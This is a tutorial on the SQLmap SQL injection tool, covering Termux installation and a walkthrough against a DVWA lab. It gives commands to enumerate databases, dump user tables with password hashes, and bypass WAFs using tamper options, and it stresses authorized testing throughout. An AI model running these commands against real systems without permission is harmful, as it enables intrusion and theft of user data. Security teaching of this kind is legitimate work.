SQLmap

SQLmap is an open-source penetration testing tool that automates the detection and exploitation of SQL injection vulnerabilities in web applications. It supports a wide range of database management systems and can perform database fingerprinting, data extraction, file system access, and command execution where feasible.

Uses

SQLmap is primarily used for identifying injectable parameters, enumerating database structures (tables, columns, data), dumping contents, and validating SQL injection risks during authorized security assessments. Example: Testing a web application's login or search form for injection flaws to assess potential data exposure.

Installation in Termux

pkg update && pkg upgrade -y
pkg install git python -y
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev

Run with python sqlmap.py -h for help. To uninstall: Remove the sqlmap-dev directory and related packages. Common issues: Python version conflicts—ensure Python 3 is used; dependency errors—run pip install -r requirements.txt if needed (install pip via pkg install python-pip).

Functions and Walkthroughs

Basic detection: python sqlmap.py -u "http://example.com/page?id=1". Enumerate databases: --dbs. Dump tables: --tables -D database_name. Full help: python sqlmap.py -hh. Always test on authorized targets only.

Detailed Tutorial: Detecting and Enumerating SQL Injection Vulnerabilities (Ethical Lab Scenario)

This tutorial demonstrates SQLmap usage on a deliberately vulnerable test application (e.g., DVWA or a local lab setup). Obtain explicit written permission before testing any live or third-party system. Unauthorized exploitation is illegal.

  1. Navigate to the tool directory: cd ~/sqlmap-dev (or wherever cloned).
  2. Test a URL for injection: python sqlmap.py -u "http://vulnerable-site.com/page?id=1" --batch – The --batch flag automates default choices. SQLmap probes the 'id' parameter and reports if injectable (e.g., "parameter 'id' is vulnerable").
  3. Identify the DBMS: If vulnerable, rerun with --dbms=mysql (or let it detect automatically) to optimize tests.
  4. List databases: python sqlmap.py -u "http://vulnerable-site.com/page?id=1" --dbs – Outputs available databases (e.g., information_schema, dvwa).
  5. Enumerate tables: python sqlmap.py -u "http://vulnerable-site.com/page?id=1" -D dvwa --tables – Lists tables like users, sessions.
  6. Dump data: python sqlmap.py -u "http://vulnerable-site.com/page?id=1" -D dvwa -T users --dump – Extracts column data (e.g., usernames, hashed passwords). Review output responsibly.
  7. Advanced options: Add --level=3 --risk=3 for deeper testing, or --tamper=space2comment to bypass weak WAFs (use ethically).

Expected results: Confirmation of vulnerability, database details, and extracted data if successful. Common issues: Rate limiting—add --delay=1; false negatives—increase risk/level. Document all findings for remediation reporting.
